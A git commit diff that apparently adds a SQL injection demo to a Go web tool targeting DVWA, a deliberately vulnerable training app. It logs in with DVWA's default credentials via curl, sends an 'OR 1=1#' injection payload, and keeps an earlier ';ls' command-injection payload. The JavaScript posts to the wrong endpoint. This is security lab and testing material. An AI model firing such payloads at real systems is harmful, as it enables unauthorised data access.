9000015421ef0aef04902c347b4579787b417c65
benoitmtl <81545589+benoitbMTL@users.noreply.github.com>
2023-06-22 22:24:19 -0400

    SQL injection

--- actions.go
+++ actions.go
@@ -14,6 +14,9 @@ func registerActions(e *echo.Echo) {
 
 	// ACTION #2 COMMAND INJECTION
 	e.POST("/command-injection", handleCommandInjectionAction)
+	
+	// ACTION #3 SQL INJECTION
+	e.POST("/sql-injection", handleSQLInjectionAction)
 }
 
 func handlePingAction(c echo.Context) error {
@@ -82,6 +85,67 @@ func handleCommandInjectionAction(c echo.Context) error {
 		"--insecure",
 		"--silent",
 		"--data-raw", "ip=;ls&Submit=Submit",
+		"-b", "cookie.txt",
+	)
+
+	output2, err := cmd2.CombinedOutput()
+	if err != nil {
+		return c.String(http.StatusInternalServerError, err.Error())
+	}
+
+	// Return the HTML content of the two curl command
+	return c.HTML(http.StatusOK, string(output)+"\n"+string(output2))
+
+}
+
+
+
+func handleSQLInjectionAction(c echo.Context) error {
+	username := c.FormValue("username")
+
+	// Map usernames to passwords
+	userPassMap := map[string]string{
+		"admin":   "password",
+		"gordonb": "abc123",
+		"1337":    "charley",
+		"pablo":   "letmein",
+		"smithy":  "password",
+	}
+
+	password, ok := userPassMap[username]
+	if !ok {
+		return c.String(http.StatusBadRequest, "Invalid username")
+	}
+
+	// Perform Authentication
+	cmd := exec.Command("curl", DVWA_URL+"/login.php",
+		"-H", "authority: "+DVWA_HOST,
+		"-H", "cache-control: max-age=0",
+		"-H", "content-type: application/x-www-form-urlencoded",
+		"-H", "origin: "+DVWA_URL,
+		"-H", "referer: "+DVWA_URL+"/",
+		"-H", "user-agent: "+USER_AGENT,
+		"--insecure",
+		"--silent",
+		"--data-raw", "username="+username+"&password="+password+"&Login=Login",
+		"-c", "cookie.txt",
+	)
+
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return c.String(http.StatusInternalServerError, err.Error())
+	}
+
+	// Execute SQL Injection
+	cmd2 := exec.Command("curl", DVWA_URL+"/vulnerabilities/sqli/?id=%27OR+1%3D1%23&Submit=Submit",
+		"-H", "authority: "+DVWA_HOST,
+		"-H", "cache-control: max-age=0",
+		"-H", "content-type: application/x-www-form-urlencoded",
+		"-H", "origin: "+DVWA_URL,
+		"-H", "referer: "+DVWA_URL+"/index.php",
+		"-H", "user-agent: "+USER_AGENT,
+		"--insecure",
+		"--silent",
 		"-b", "cookie.txt",
 	)
 
--- static/js/actions.js
+++ static/js/actions.js
@@ -81,8 +81,69 @@ function resetCommandInjection() {
     parentContainer.appendChild(newIframe);
 }
 
+
+///////////////////////////////////////////////////////////////////////////////////
+// SQL INJECTION                                                                 //
+///////////////////////////////////////////////////////////////////////////////////
+
+function performSQLInjection() {
+    var username = document.getElementById('username').value;
+
+    // Map usernames to passwords
+    var userPassMap = {
+        "admin": "password",
+        "gordonb": "abc123",
+        "1337": "charley",
+        "pablo": "letmein",
+        "smithy": "password"
+    };
+
+    var password = userPassMap[username];
+
+    fetch('/command-injection', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: 'username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password)
+    })
+        .then(response => response.text())
+        .then(htmlContent => {
+            document.getElementById('sql-injection-result').srcdoc = htmlContent;
+            document.getElementById('sql-injection-result').style.height = '0px';
+        })
+        .catch(error => console.error('Error:', error));
+
+}
+
+// Function to reset the SQL injection result
+function resetSQLInjection() {
+    var iframe = document.getElementById('sql-injection-result');
+
+    // Remove the iframe element
+    iframe.parentNode.removeChild(iframe);
+
+    // Create a new iframe element
+    var newIframe = document.createElement('iframe');
+    newIframe.id = 'sql-injection-result';
+    newIframe.className = 'action-result border';
+    newIframe.style.width = '100%';
+    newIframe.onload = function () {
+        resizeIframe(this);
+    };
+
+    // Append the new iframe to its parent container
+    var parentContainer = document.getElementById('sql-injection-container');
+    parentContainer.appendChild(newIframe);
+}
+
+
+///////////////////////////////////////////////////////////////////////////////////
+// Function to adjust the height of the iframe based on its content              //
+///////////////////////////////////////////////////////////////////////////////////
+
 // Function to adjust the height of the iframe based on its content:
 function resizeIframe(iframe) {
-    iframe.style.height = (iframe.contentWindow.document.body.scrollHeight + 5) + 'px';
+    iframe.style.height = (iframe.contentWindow.document.body.scrollHeight + 1) + 'px';
 }
 
